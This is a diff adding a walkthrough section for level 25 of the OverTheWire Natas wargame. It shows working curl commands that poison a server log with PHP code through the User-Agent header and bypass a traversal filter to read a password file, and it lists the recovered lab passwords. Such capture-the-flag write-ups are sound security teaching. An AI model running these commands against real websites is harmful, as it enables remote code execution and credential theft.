@@ -416,3 +416,36 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Password for natas25:** `UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo`
 - **Verification:** `http://natas25.natas.labs.overthewire.org/` with `natas25:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L24.cast`
+
+## Level 25 → natas26
+- **Account:** `natas25`, password `UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo`.
+- **Goal:** The page includes a language file chosen by `?lang=`. `safeinclude()` blocks `natas_webpass` and strips `../`; `logRequest()` writes our `User-Agent` into `logs/natas25_<PHPSESSID>.log` inside the web root.
+- **Technique and why it works:** **log poisoning plus a non-recursive traversal filter**. Two flaws chain:
+  1. `logRequest()` writes attacker-controlled data (the `User-Agent` header) into a `.log` file that lives under the web root and is served/included as PHP. So we can write PHP code into it.
+  2. The traversal filter is `if(strstr($filename,"../")) { $filename = str_replace("../","",$filename); }`. `str_replace` is a *single* pass: on `....//logs/...` it removes the `../` at offset 2 and leaves `../logs/...` — traversal survives. The `natas_webpass` check then never sees that string, because the file we include is our log.
+
+  We trigger the log write with a deliberate traversal (`lang=../x`), which calls `logRequest()`, and put PHP code in the `User-Agent`. Then we include our own log file: `lang=....//logs/natas25_<sid>.log`. PHP executes the code inside the log.
+
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** `safeinclude()` shows the `str_replace("../","",...)` strip and the `natas_webpass` block; `logRequest()` shows the exact log path and that the UA is written verbatim.
+2. **Start a session and note the id.**
+   ```
+   curl -s -c /tmp/n25.jar -u natas25:<pw> http://natas25.natas.labs.overthewire.org/
+   awk '/PHPSESSID/{print $7}' /tmp/n25.jar     # PHPSESSID=9h17ef548pbk7dgokpcrnmqshs
+   ```
+   The session id is needed because the log file name contains it.
+3. **Write PHP into the log.** Send `lang=../x` (a traversal, so `logRequest` fires) with the code in `-A`:
+   ```
+   curl -s -b /tmp/n25.jar -u natas25:<pw>         -A '<?php var_dump(file_get_contents("/etc/natas_webpass/natas26")); ?>'         --get --data-urlencode 'lang=../x' http://natas25.natas.labs.overthewire.org/
+   ```
+   The log line becomes: `[date] <?php ... ?> "Directory traversal attempt! fixing request."` — a valid PHP file containing our code.
+4. **Include the log with the `....//` bypass.**
+   ```
+   curl -s -b /tmp/n25.jar -u natas25:<pw>         --get --data-urlencode 'lang=....//logs/natas25_9h17ef548pbk7dgokpcrnmqshs.log'         http://natas25.natas.labs.overthewire.org/
+   # [01.11.2026 05::02:36] string(33) "3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT
+   ```
+   The `str_replace` removed `../` at offset 2 of `....//`, leaving `../logs/...`: the include resolved to our log, PHP executed the payload, and `var_dump` printed the contents of the natas26 password file.
+5. **Verify.** `curl -u natas26:<pw> http://natas26.natas.labs.overthewire.org/` → HTTP 200.
+- **Password for natas26:** `3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT`
+- **Verification:** `http://natas26.natas.labs.overthewire.org/` with `natas26:<password>` → HTTP 200.
+- **Recording:** `recordings/natas/L25.cast`
